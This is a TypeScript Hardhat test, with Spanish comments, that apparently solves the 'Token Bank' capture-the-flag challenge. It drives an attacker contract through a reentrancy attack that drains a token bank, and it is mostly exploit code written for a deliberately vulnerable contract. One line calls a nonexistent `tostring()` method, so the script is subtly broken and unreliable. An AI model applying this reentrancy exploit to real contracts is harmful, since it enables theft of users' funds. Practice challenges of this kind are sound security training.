import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";

let tokenBankContract: Contract;
let dosCompletosContract: Contract;
let simpleTokenContract: Contract;
let eoa: Signer;
const TOKEN_BANK_CHALLENGE_ADDRESS: string = "0x4Eea8772504eA7BB644a6Bc62263EbA4D0503fD4"
const CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS:string = "0xa737d728ec7527D35def1ED7ff0420Ac88b549f9" 
const SIMPLE_TOKEN_CONTRACT_ADDRESS = "0xAA5B62eC094bE44D77D5745EaF6a693efA1F97E8";
const NUESTRO_BALANCE_DE_ARRANQUE = ethers.utils.parseEther(`500000`);

beforeEach(async () => {
  [eoa] = await ethers.getSigners();
  //Contrato del tokenBank
  const tokenBankFactory = await ethers.getContractFactory("TokenBankChallenge");
  tokenBankContract = tokenBankFactory.attach(TOKEN_BANK_CHALLENGE_ADDRESS);

  //Contrato del simpleToken
  const simpleTokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  simpleTokenContract = simpleTokenFactory.attach(SIMPLE_TOKEN_CONTRACT_ADDRESS);

  //Contrato atacante que se robará hasta tu corazón bebe.
  const dosCompletosFactory = await ethers.getContractFactory("DosCompletosDesconocidos");
  dosCompletosContract = dosCompletosFactory.attach(CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS);
})

describe("Token Bank", async () => {
  it("Resuelve el Miscellaneous challenge - Token Bank", async () => {
    // Primero movemos los tokens desde el tokenBankContract a nuestra cuenta.    
    const txTokensDeChallengeHaciaEOA = await tokenBankContract.withdraw(NUESTRO_BALANCE_DE_ARRANQUE);
    await txTokensDeChallengeHaciaEOA.wait();
    console.log("TOKENS TRANSFERIDOS A NUESTRA EOA");
    console.log(simpleTokenContract);
    

    // Ahora mandamos de nuestra cuenta al contrato DosCompletosDesconocidos. Recordemos que para entrar en reentrancy, transfer debe ser llamado desde un contrato, no una cuenta (por eso le pasamos el balance)
    const txTokensDeEOAHaciaDosCompletos = await simpleTokenContract.transfer(
      CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS,
      NUESTRO_BALANCE_DE_ARRANQUE
    );
    console.log("TOKENS TRANSFERIDOS DE NUESTRA EOA A CONTRATO ATACANTE");
    
    // const txTokensDeEOAHaciaDosCompletos = await simpleTokenContract.transfer(
    //   dosCompletosContract.address,
    //   NUESTRO_BALANCE_DE_ARRANQUE
    // );
    await txTokensDeEOAHaciaDosCompletos.wait();

    // Ahora mandamos del contrato DosCompletosDesconocidos al contrato tokenBank, para que se registre nuestro balance.
    const txDepositoDesdeDosCompletos = await dosCompletosContract.deposit();
    await txDepositoDesdeDosCompletos.wait();
    console.log("TOKENS TRANSFERIDOS DE CONTRATO ATACANTE A TOKEN BANK");
    

    //#region Ataque + Demostracion por consola del balance 
    const dosCompletosBalancePreAtaque = await tokenBankContract.balanceOf(dosCompletosContract.address);
    console.log(`EL BALANCE PREVIO EN CONTRATO ATACANTE ES: `, dosCompletosBalancePreAtaque.toString());
    console.log(``);

    //Realizamos el ataque
    console.log(`INICIO DEL ATAQUE DE REENTRANCY A TokenBankChallenge...`);

    const txAtaqueDeReentrancy = await dosCompletosContract.atacar();
    await txAtaqueDeReentrancy.wait();

    const dosCompletosBalancePostAtaque = await tokenBankContract.balanceOf(dosCompletosContract.address)
    console.log(`ATAQUE FINALIZADO. NUEVO BALANCE EN CONTRATO ATACANTE: `, dosCompletosBalancePostAtaque.tostring());

    //#endregion Demostracion por consola del balance

    //Chequeo si isComplete es true
    let isComplete = await tokenBankContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
  })
})